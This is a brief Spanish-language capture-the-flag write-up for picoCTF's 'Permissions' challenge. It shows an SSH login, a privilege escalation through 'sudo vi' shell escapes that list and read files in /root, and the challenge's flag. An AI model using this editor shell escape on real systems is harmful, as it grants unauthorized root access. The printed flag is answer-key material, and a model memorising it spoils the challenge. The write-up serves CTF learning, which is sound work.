Reto
Permissions
Descripción
Can you read files in the root file?
Additional details will be available after launching your challenge instance.
Solución
```
ssh -p 63370 picoplayer@saturn.picoctf.net

picoplayer@challenge:~$ sudo vi
[sudo] password for picoplayer:

[esc] :! ls -a /root
.  ..  .bashrc  .flag.txt  .profile

[esc] :! cat /root/.flag.txt

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```
Notas adicionales
Use el editor vi con sudo para poder tener permisos
Referencias